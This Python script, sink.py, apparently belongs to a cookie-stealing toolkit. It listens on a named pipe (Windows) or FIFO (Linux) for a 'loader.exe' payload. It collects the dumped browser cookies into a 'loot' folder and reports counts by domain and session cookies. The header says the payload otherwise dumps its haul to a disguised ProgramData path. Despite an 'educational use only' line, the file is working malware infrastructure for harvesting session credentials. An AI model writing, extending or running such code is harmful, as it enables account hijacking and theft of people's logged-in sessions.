# sink.py -- receives the payload dump and writes it to disk.
# Windows: named pipe \\.\pipe\ck_pipe (the payload's fallback). Linux: FIFO
# /tmp/ck_pipe (same protocol: one JSON dump per connection, then EOF).
#          Run BEFORE loader.exe: the payload waits ~10 s and, with nobody on the other side,
#          dumps everything to C:\ProgramData\MediaCache\cache.json outside the reports.
#
#   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING.
#   Only use on systems you own or are explicitly authorized to test.
import json, os, sys, time
from cklog import coverage as coveragelib
from cklog import loot as lootlib
IS_WIN = (sys.platform == "win32")

if IS_WIN:
    import ctypes
    from ctypes import wintypes

PIPE, BUFSZ = r"\\.\pipe\ck_pipe", 1 << 20
FIFO = "/tmp/ck_pipe"
HERE  = os.path.dirname(os.path.abspath(__file__))
LOOT  = os.path.join(HERE, "loot")
os.makedirs(LOOT, exist_ok=True)
TXT   = os.path.join(LOOT, "cookies_all.txt")
JSONF = os.path.join(LOOT, "cookies_all.json")

if IS_WIN:
    PIPE_ACCESS_DUPLEX, PIPE_UNLIMITED = 0x03, 255
    PIPE_REJECT_REMOTE_CLIENTS = 0x08
    ERROR_PIPE_CONNECTED, ERROR_BROKEN_PIPE = 534, 109
    INVALID = wintypes.HANDLE(-1).value                 # 0xFFFFFFFFFFFFFFFF, not -1

    k32 = ctypes.WinDLL("kernel32", use_last_error=True)   # WinDLL = stdcall; use_last_error for GetLastError
    H, D, B, L = wintypes.HANDLE, wintypes.DWORD, wintypes.BOOL, wintypes.LPVOID

    def proto(name, restype, *args):                     # NO handle call without this
        f = getattr(k32, name); f.restype = restype; f.argtypes = list(args) or None
        return f

    CreateNamedPipeW    = proto("CreateNamedPipeW", H, wintypes.LPCWSTR, D, D, D, D, D, D, L)
    ConnectNamedPipe    = proto("ConnectNamedPipe", B, H, L)
    ReadFile            = proto("ReadFile", B, H, L, D, ctypes.POINTER(D), L)
    DisconnectNamedPipe = proto("DisconnectNamedPipe", B, H)
    CloseHandle         = proto("CloseHandle", B, H)


def serve():
    """Creates the pipe ONCE and keeps listening for connections in a loop on the same handle.
    Between DisconnectNamedPipe and ConnectNamedPipe the handle remains valid:
    there is no window where the pipe ceases to exist."""
    if not IS_WIN:
        # Linux: same protocol over a FIFO -- one JSON dump per connection, EOF ends it
        try: os.unlink(FIFO)
        except FileNotFoundError: pass
        os.mkfifo(FIFO, 0o600)
        print(f"[sink] listening on {FIFO}  (Ctrl+C to stop)")
        while True:
            with open(FIFO, "rb") as f:               # blocks until a writer opens the FIFO
                print("[sink] client connected, reading...")
                data = f.read()                        # EOF when the writer closes: dump complete
            if data:
                yield data
            print("[sink] waiting for loader...")
    h = CreateNamedPipeW(PIPE, PIPE_ACCESS_DUPLEX, 0, PIPE_UNLIMITED,
                         BUFSZ, BUFSZ, PIPE_REJECT_REMOTE_CLIENTS, None)
    if h == INVALID:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[sink] listening on {PIPE}  (Ctrl+C to stop)")
    try:
        while True:
            # wait for a client to connect (blocking)
            if not ConnectNamedPipe(h, None):
                e = ctypes.get_last_error()
                if e != ERROR_PIPE_CONNECTED:            # 534 = already connected, not an error
                    raise ctypes.WinError(e)
            print("[sink] client connected, reading...")
            buf, got, data = ctypes.create_string_buffer(BUFSZ), D(0), bytearray()
            while True:
                if not ReadFile(h, buf, BUFSZ, ctypes.byref(got), None):
                    e = ctypes.get_last_error()
                    if e == ERROR_BROKEN_PIPE: break     # the loader closed: dump complete
                    raise ctypes.WinError(e)
                if got.value == 0: break
                data.extend(buf.raw[:got.value])
            DisconnectNamedPipe(h)                        # disconnects the client, KEEPS the handle
            yield bytes(data)
            print("[sink] waiting for loader...")
    finally:
        CloseHandle(h)


def expiry(c):
    """The payload writes expirationDate; cookielog.py writes expires."""
    return lootlib.expiry(c)


def merge(new):
    old = lootlib.load_json(JSONF)
    keep = lambda c: isinstance(c, dict) and c.get("name") and c.get("domain")
    # replace=True: the most recent value wins, same as listen.py
    return lootlib.merge([c for c in old if keep(c)],
                         [c for c in new if keep(c)], replace=True)


def write_txt(rows):
    lootlib.write_txt(TXT, rows)


def main():
    print("[sink] waiting for loader...")
    for raw in serve():
        try:
            obj = json.loads(raw.decode("utf-8", "replace"))
        except Exception as ex:
            print(f"[-] unreadable JSON ({len(raw)} bytes): {ex}"); continue
        # Stage 2 sends {"records":[...],"coverage":{...}}; older payloads send a bare list.
        coverage = None
        if isinstance(obj, dict):
            coverage = obj.get("coverage")
            rows = obj.get("records") or obj.get("cookies") or []
        else:
            rows = obj
        if coverage is not None:
            m = coveragelib.manifest(coverage)
            coveragelib.append(LOOT, m)
            print("[coverage] " + coveragelib.summarize(m))
        if not isinstance(rows, list):
            print("[-] payload sent a non-list payload (%s)" % type(rows).__name__); continue
        rows = [c for c in rows if isinstance(c, dict) and c.get("name") and c.get("domain")]
        if not rows:
            print("[-] dump had no usable cookie records"); continue
        alls = merge(rows)
        with open(JSONF, "w", encoding="utf-8") as f:
            json.dump(alls, f, ensure_ascii=False, indent=1)
        write_txt(alls)
        top = {}
        for c in rows: top[c.get("domain") or "?"] = top.get(c.get("domain") or "?", 0) + 1
        s = sum(1 for c in rows if not expiry(c))
        host = next((c.get("_host") for c in rows if c.get("_host")), "local pipe")
        print(f"[+] {len(rows)} cookies from {host} ({s} session) | total: {len(alls)} -> {TXT}")
        for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:12]: print(f"    {n:5d}  {d}")

main()
